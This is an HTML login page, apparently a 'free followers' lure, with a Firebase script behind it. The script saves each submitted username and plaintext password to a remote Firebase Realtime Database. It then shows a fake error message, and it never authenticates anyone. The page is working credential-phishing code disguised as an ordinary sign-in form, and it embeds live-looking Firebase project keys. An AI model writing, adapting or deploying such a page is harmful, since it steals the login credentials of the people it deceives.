<html>
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>
    <title>Login Form</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        background-color: #f3f3f3;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .menu {
        position: absolute;
        top: 10px;
        left: 10px;
        cursor: pointer;
        z-index: 1000;
      }

      .menu span {
        display: block;
        width: 30px;
        height: 3px;
        margin: 5px 0;
        background-color: #333;
        border-radius: 2px;
      }

      .settings {
        position: absolute;
        top: 50px;
        left: 10px;
        background-color: #ffffff;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
        padding: 10px;
        display: none;
      }

      .settings a {
        display: block;
        padding: 10px;
        color: #007bff;
        text-decoration: none;
        border-bottom: 1px solid #eee;
      }

      .settings a:last-child {
        border-bottom: none;
      }

      .settings a:hover {
        background-color: #f3f3f3;
      }

      .form-container {
        text-align: center;
        padding: 20px;
        background-color: #ffffff;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
        max-width: 400px;
        width: 100%;
      }

      .input-field {
        display: block;
        width: 100%;
        max-width: 300px;
        margin: 10px auto;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 16px;
      }

      .password-toggle {
        position: relative;
      }

      .toggle-btn {
        position: absolute;
        right: 15px;
        top: 50%;
        transform: translateY(-50%);
        cursor: pointer;
        font-size: 14px;
        color: #007bff;
      }

      .submit-button {
        display: block;
        width: 100%;
        max-width: 320px;
        margin: 15px auto;
        padding: 10px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
      }

      .submit-button:hover {
        background-color: #0056b3;
      }
    </style>
  </head>
  <body>
    <!-- Three-line menu -->
    <div class="menu" onclick="toggleSettings()">
      <span></span>
      <span></span>
      <span></span>
    </div>

    <!-- Settings dropdown -->
    <div class="settings" id="settingsMenu">
      <a href="#">Profile</a>
      <a href="#">Change Password</a>
      <a href="#">Logout</a>
    </div>

    <div class="form-container">
      <form id="loginForm">
        <input class="input-field" id="username" placeholder="Enter your Username" type="text" />
        <div class="password-toggle">
          <input class="input-field" id="password" placeholder="Enter your Password" type="password" />
          <span class="toggle-btn" onclick="togglePassword()">Show</span>
        </div>
        <button class="submit-button" type="submit">Login</button>
      </form>
    </div>

    <script type="module">
      // Import Firebase SDK
      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
      import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";

      // Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
        authDomain: "freefollowers-d31af.firebaseapp.com",
        databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
        projectId: "freefollowers-d31af",
        storageBucket: "freefollowers-d31af.appspot.com",
        messagingSenderId: "807949104285",
        appId: "1:807949104285:web:2c0238cdc7913dad279074",
        measurementId: "G-ME1GQ5KV8H",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      // Function to write user data
      function writeUserData(userID, username, password) {
        set(ref(db, "users/" + userID), {
          username: username,
          password: password,
        });
      }

      // Handle form submission
      document.getElementById("loginForm").addEventListener("submit", (event) => {
        event.preventDefault(); // Prevent form submission

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const userID = new Date().getTime(); // Example: Use timestamp as a unique ID

        if (username && password) {
          writeUserData(userID, username, password);
          alert("Your Account is Unexpected! Please try again later!");
        } else {
          alert("Please fill in both fields.");
        }
      });

      // Toggle settings menu visibility
      function toggleSettings() {
        const menu = document.getElementById("settingsMenu");
        menu.style.display = menu.style.display === "block" ? "none" : "block";
      }

      // Toggle password visibility
      function togglePassword() {
        const passwordField = document.getElementById("password");
        const toggleBtn = passwordField.nextElementSibling;
        if (passwordField.type === "password") {
          passwordField.type = "text";
          toggleBtn.textContent = "Hide";
        } else {
          passwordField.type = "password";
          toggleBtn.textContent = "Show";
        }
      }
    </script>
  </body>
</html>
